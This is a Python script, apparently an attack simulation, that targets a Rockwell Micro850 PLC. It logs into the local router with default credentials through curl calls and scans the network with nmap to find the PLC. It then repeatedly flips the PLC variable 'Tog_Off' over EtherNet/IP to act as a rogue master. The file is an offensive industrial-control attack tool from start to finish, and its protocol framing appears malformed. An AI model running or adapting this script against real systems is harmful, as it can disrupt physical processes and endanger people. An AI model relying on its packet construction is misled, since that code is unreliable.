# MITRE ATT&CK Technique T0814: Rogue Master
# Simulated attack on a Rockwell Micro850 PLC

import socket
import struct
import time
import logging
import subprocess
import re

# Configuration
PLC_IP = None  # Initially unknown; will be discovered
PLC_PORT = 44818  # Default EtherNet/IP port (explicit messaging)
ROUTER_IP = "192.168.1.1" #ip address of the local network router
ROUTER_USERNAME = "admin" #user of the local network router
ROUTER_PASSWORD = "password" #password of the local network router
ATTACK_DURATION = 60  # seconds
TOGGLE_INTERVAL = 5  # seconds -  how often to toggle the "Tog_Off" variable
TARGET_VARIABLE = "Tog_Off"  # Variable to manipulate
TOGGLE_VALUE = True  # Value to set the variable to (toggle)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network.
    Uses a simple ARP scan via nmap. Requires nmap to be installed and in the system PATH.

    Returns:
        str: The IP address of the PLC if found, None otherwise.
    """
    try:
        # First, determine the local network's IP range. This assumes the workstation
        # is on the same subnet as the PLC. A more sophisticated approach would be
        # to parse the output of `ipconfig` or `ifconfig` to get the correct interface.

        # Get the gateway IP address.
        command = f"curl -s 'http://{ROUTER_IP}/Login.htm' | grep 'var loginPassword' | awk -F \"'\" '{{print $2}}'"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        challenge_key = stdout.decode().strip()

        command = f"curl --data \"username={ROUTER_USERNAME}&pswd='{ROUTER_PASSWORD}'&challenge={challenge_key}\" 'http://{ROUTER_IP}/goform/login'"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        cookies = stdout.decode().strip()

        command = f"curl -s -b \"{cookies}\" 'http://{ROUTER_IP}/Advanced_Wireless_Content.htm' | grep 'var lan_ip' | awk -F \"'\" '{{print $2}}'"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        lan_ip = stdout.decode().strip()

        command = f"curl -s -b \"{cookies}\" 'http://{ROUTER_IP}/Advanced_Wireless_Content.htm' | grep 'var lan_netmask' | awk -F \"'\" '{{print $2}}'"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        lan_netmask = stdout.decode().strip()

        ip_parts = lan_ip.split('.')
        netmask_parts = lan_netmask.split('.')

        network_address = ".".join([str(int(ip_parts[i]) & int(netmask_parts[i])) for i in range(4)])

        # Calculate the CIDR notation
        cidr = sum([bin(int(x)).count('1') for x in netmask_parts])

        network_range = f"{network_address}/{cidr}"
        logging.info(f"Scanning network range: {network_range}")

        # Run nmap ARP scan
        nmap_command = ["nmap", "-sn", "-PR", network_range]
        nmap_process = subprocess.Popen(nmap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        nmap_stdout, nmap_stderr = nmap_process.communicate()

        # Parse nmap output for potential PLC IP addresses (filter by vendor)
        output = nmap_stdout.decode()
        for line in output.splitlines():
            if "Rockwell" in line or "Allen-Bradley" in line:  # Common PLC vendor strings
                match = re.search(r"Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
                if match:
                    ip_address = match.group(1)
                    logging.info(f"Potential PLC IP found: {ip_address}")
                    return ip_address  # Return the first found; refine as needed

        logging.warning("No Rockwell/Allen-Bradley devices found on the network.")
        return None

    except FileNotFoundError:
        logging.error("nmap not found.  Please install nmap and ensure it is in your system's PATH.")
        return None
    except Exception as e:
        logging.error(f"Error during IP discovery: {e}")
        return None


def build_cip_packet(service_code, class_id, instance_id, attribute_id, data=None):
    """
    Builds a basic Common Industrial Protocol (CIP) packet for explicit messaging.

    Args:
        service_code (int): CIP service code.  See CIP specifications.
        class_id (int): CIP class ID.  Identifies the object type.
        instance_id (int): CIP instance ID.  Identifies the specific object instance.
        attribute_id (int): CIP attribute ID.  Identifies the attribute to access.
        data (bytes, optional): Data to write. Defaults to None.

    Returns:
        bytes: The constructed CIP packet.
    """

    # General Structure
    command = 0x0001  # List Services
    length = 0  # Placeholder, will be calculated later
    session_handle = 0x00000000  # Fill after connection established
    status = 0x00000000  # No status yet
    sender_context = b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Unique ID (8 bytes)
    options = 0x00000000  # No options

    # CIP Message
    interface_class = 0x01  # Ethernet/IP
    interface_trigger = 0x01
    sequence_number = 0x0000 #Always zero

    # Construct the CIP path
    route_path_size = 0x02  # Number of 16-bit words in the path
    port_segment = 0x01
    port_number = 0x01
    logical_segment = 0x20 #Class ID
    logical_class = 0x06 #Symbol Object Class
    logical_segment2 = 0x24 #Instance ID
    logical_instance = 0x01 #Singleton Object Instance

    # Build the CIP message
    cip_message = struct.pack("<BBHBBBB", route_path_size, port_segment, port_number, logical_segment, logical_class, logical_segment2, logical_instance)

    # Service Request
    cip_message += struct.pack("<B", service_code)
    cip_message += struct.pack("<H", class_id)
    cip_message += struct.pack("<H", instance_id)
    cip_message += struct.pack("<H", attribute_id)

    if data:
         cip_message += data

    # Encapsulation Header
    length = len(cip_message)
    header = struct.pack("<HHII8sI", command, length, session_handle, status, sender_context, options)

    packet = header + cip_message
    return packet

def send_cip_message(sock, message):
    """Sends the CIP message over the established socket."""
    sock.send(message)
    response = sock.recv(4096)  # Adjust buffer size as needed
    return response

def get_symbol_value(sock, symbol_name):
    """Reads the value of a symbol from the PLC."""
    # 1. Lookup Symbol Handle (Service Code 0x53)
    symbol_name_bytes = symbol_name.encode('utf-8')
    length = len(symbol_name_bytes)
    request_data = struct.pack("<H", length) + symbol_name_bytes

    cip_packet = build_cip_packet(service_code=0x53, class_id=0x6B, instance_id=0x01, attribute_id=0x00, data=request_data)
    response = send_cip_message(sock, cip_packet)

    # Error handling
    if len(response) < 36:
        logging.error(f"Invalid symbol name: {symbol_name}")
        return None

    status_code = struct.unpack("<H", response[34:36])[0]
    if status_code != 0x0000:
        logging.error(f"Lookup failed: {hex(status_code)}")
        return None

    # Parse Symbol Handle
    symbol_handle = struct.unpack("<I", response[40:44])[0]
    logging.info(f"Symbol handle for '{symbol_name}': {symbol_handle}")

    # 2. Read Value using Symbol Handle (Service Code 0x4C)
    request_data = struct.pack("<I", symbol_handle)
    cip_packet = build_cip_packet(service_code=0x4C, class_id=0x6B, instance_id=0x01, attribute_id=0x00, data=request_data)
    response = send_cip_message(sock, cip_packet)

    # Error handling
    if len(response) < 46:
        logging.error(f"Invalid response length: {len(response)}")
        return None

    status_code = struct.unpack("<H", response[34:36])[0]
    if status_code != 0x0000:
        logging.error(f"Read failed: {hex(status_code)}")
        return None

    # Parse Value (assuming BOOL for this example)
    value = struct.unpack("<B", response[46:47])[0]
    logging.info(f"Current value of '{symbol_name}': {bool(value)}")
    return bool(value)

def set_symbol_value(sock, symbol_name, value):
    """Writes a value to a symbol in the PLC."""

    # 1. Lookup Symbol Handle (Service Code 0x53)
    symbol_name_bytes = symbol_name.encode('utf-8')
    length = len(symbol_name_bytes)
    request_data = struct.pack("<H", length) + symbol_name_bytes

    cip_packet = build_cip_packet(service_code=0x53, class_id=0x6B, instance_id=0x01, attribute_id=0x00, data=request_data)
    response = send_cip_message(sock, cip_packet)

     # Error handling
    if len(response) < 36:
        logging.error(f"Invalid symbol name: {symbol_name}")
        return

    status_code = struct.unpack("<H", response[34:36])[0]
    if status_code != 0x0000:
        logging.error(f"Lookup failed: {hex(status_code)}")
        return

    # Parse Symbol Handle
    symbol_handle = struct.unpack("<I", response[40:44])[0]
    logging.info(f"Symbol handle for '{symbol_name}': {symbol_handle}")

    # 2. Write Value using Symbol Handle (Service Code 0x4D)
    write_data = struct.pack("<I", symbol_handle) + struct.pack("<B", int(value)) #Assuming Boolean
    cip_packet = build_cip_packet(service_code=0x4D, class_id=0x6B, instance_id=0x01, attribute_id=0x00, data=write_data)
    response = send_cip_message(sock, cip_packet)

    # Error handling
    if len(response) < 36:
        logging.error(f"Invalid response length: {len(response)}")
        return

    status_code = struct.unpack("<H", response[34:36])[0]
    if status_code != 0x0000:
        logging.error(f"Write failed: {hex(status_code)}")
        return

    logging.info(f"Successfully set '{symbol_name}' to {value}")


def main():
    global PLC_IP

    # 1. Discover PLC IP
    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            logging.error("PLC IP address not found.  Exiting.")
            return

    logging.info(f"Using PLC IP address: {PLC_IP}")

    # 2. Establish Socket Connection
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Timeout for connection and communication
        sock.connect((PLC_IP, PLC_PORT))
        logging.info(f"Connected to PLC at {PLC_IP}:{PLC_PORT}")
    except socket.error as e:
        logging.error(f"Could not connect to PLC: {e}")
        return

    # 3. Implement Rogue Master Attack - Toggle Variable
    start_time = time.time()
    try:
        while time.time() - start_time < ATTACK_DURATION:
            #Get current value
            current_value = get_symbol_value(sock, TARGET_VARIABLE)

            if current_value is not None:
                #Toggle the variable
                new_value = not current_value
                set_symbol_value(sock, TARGET_VARIABLE, new_value)
            else:
                logging.error("Failed to get current value.  Attempting reconnection.")
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)  # Timeout for connection and communication
                sock.connect((PLC_IP, PLC_PORT))
                logging.info(f"Reconnected to PLC at {PLC_IP}:{PLC_PORT}")

            time.sleep(TOGGLE_INTERVAL)
    except KeyboardInterrupt:
        logging.info("Attack stopped by user.")
    except socket.error as e:
        logging.error(f"Socket error during attack: {e}")
    finally:
        # 4. Clean up and close connection
        if 'sock' in locals(): # Check if the socket was successfully created
            sock.close()
            logging.info("Socket closed.")


if __name__ == "__main__":
    main()